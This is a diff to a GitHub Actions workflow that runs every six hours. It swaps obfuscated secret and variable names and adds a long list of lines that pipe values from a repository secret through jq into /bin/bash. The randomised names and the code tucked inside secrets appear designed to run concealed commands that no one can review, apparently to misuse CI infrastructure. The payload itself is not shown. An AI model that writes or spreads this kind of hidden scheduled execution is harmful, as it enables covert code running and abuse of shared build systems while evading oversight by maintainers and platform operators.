@@ -1,17 +1,31 @@
 name: yinjiexx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 1/6 * * *'
-jobs:  # 32723
+    - cron: '33 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yinjiexx
         env:
-          p1941: ${{ secrets.p1941 }}
+          xq17: ${{ secrets.xq17 }}
         run: |
-          echo $p1941 | jq -r .wg57 | /bin/bash
-          echo $jc32 | jq -r .pjzme1 | /bin/bash
+          echo $xq17 | jq -r .szeqi59932 | /bin/bash
+          echo $hucb81 | jq -r .fidh0 | /bin/bash
+          echo $m7807 | jq -r .to54414 | /bin/bash
+          echo $qjbx64624 | jq -r .xbw0 | /bin/bash
+          echo $tjr6445 | jq -r .hnha6 | /bin/bash
+          echo $zqffl2880 | jq -r .dv25 | /bin/bash
+          echo $icfqf6 | jq -r .vruu17 | /bin/bash
+          echo $k42946 | jq -r .onpc3414 | /bin/bash
+          echo $dho3 | jq -r .c24975 | /bin/bash
+          echo $umh7634 | jq -r .ppr88 | /bin/bash
+          echo $x50 | jq -r .zv923 | /bin/bash
+          echo $julkp067 | jq -r .nxvn751 | /bin/bash
+          echo $rzzm26337 | jq -r .t6558 | /bin/bash
+          echo $vuu73 | jq -r .flqx032 | /bin/bash
 
